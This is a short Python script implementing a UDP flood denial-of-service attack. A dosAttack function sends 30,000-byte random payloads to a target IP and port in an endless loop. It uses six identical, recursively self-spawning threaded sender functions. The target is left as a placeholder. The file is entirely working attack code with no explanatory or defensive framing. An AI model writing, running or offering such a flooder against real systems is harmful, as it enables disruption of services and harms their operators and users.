import multiprocessing
import random
import socket
import threading


def createThreads(function):
    def inner(*args):
        t = threading.Thread(target=function, args=(args[0],args[1],args[2] ))
        t.start()
    return inner


@createThreads
def sendPackets(socket, bytes: bytes, userInfo: tuple) -> None:
    socket.sendto(bytes, userInfo)
    print(f"[*]Sent packets to {userInfo}")
    sendPackets(socket, bytes, userInfo)


@createThreads
def sendPackets2(socket, bytes: bytes, userInfo: tuple) -> None:
    socket.sendto(bytes, userInfo)
    print(f"[*]Sent packets to {userInfo}")
    sendPackets2(socket, bytes, userInfo)


@createThreads
def sendPackets3(socket, bytes: bytes, userInfo: tuple) -> None:
    socket.sendto(bytes, userInfo)
    print(f"[*]Sent packets to {userInfo}")
    sendPackets3(socket, bytes, userInfo)


@createThreads
def sendPackets4(socket, bytes: bytes, userInfo: tuple) -> None:
    socket.sendto(bytes, userInfo)
    print(f"[*]Sent packets to {userInfo}")
    sendPackets4(socket, bytes, userInfo)


@createThreads
def sendPackets5(socket, bytes: bytes, userInfo: tuple) -> None:
    socket.sendto(bytes, userInfo)
    print(f"[*]Sent packets to {userInfo}")
    sendPackets5(socket, bytes, userInfo)


@createThreads
def sendPackets6(socket, bytes: bytes, userInfo: tuple) -> None:
    socket.sendto(bytes, userInfo)
    print(f"[*]Sent packets to {userInfo}")
    sendPackets6(socket, bytes, userInfo)


def dosAttack(ip: str, port: int) -> None:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packets: bytes = random.randbytes(30000)
    mp = multiprocessing.Process(target=infinityLoop, args=(s, packets, (ip, port), ))
    mp.start()


def infinityLoop(s, packets: bytes, tuple_: tuple) -> None:
    while True:
        sendPackets(s, packets, tuple_)
        sendPackets2(s, packets, tuple_)
        sendPackets3(s, packets, tuple_)
        sendPackets4(s, packets, tuple_)
        sendPackets5(s, packets, tuple_)
        sendPackets6(s, packets, tuple_)


if __name__ == '__main__':
    dosAttack("ip", 80)
